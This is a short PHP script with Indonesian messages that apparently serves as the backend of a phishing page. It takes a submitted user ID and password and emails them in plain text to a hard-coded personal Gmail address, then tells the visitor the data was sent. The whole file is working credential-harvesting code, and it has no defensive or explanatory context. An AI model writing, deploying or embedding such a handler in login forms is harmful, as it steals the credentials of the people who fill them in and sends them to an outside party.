
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $id = $_POST["id"];
    $password = $_POST["password"];

    $to = "imoell10101988@gmail.com";
    $subject = "Data Pengguna Masuk";
    $message = "ID Pengguna: $id\nPassword: $password";

    mail($to, $subject, $message);

    echo "Data telah dikirim.";
} else {
    echo "Permintaan tidak valid.";
}
?>
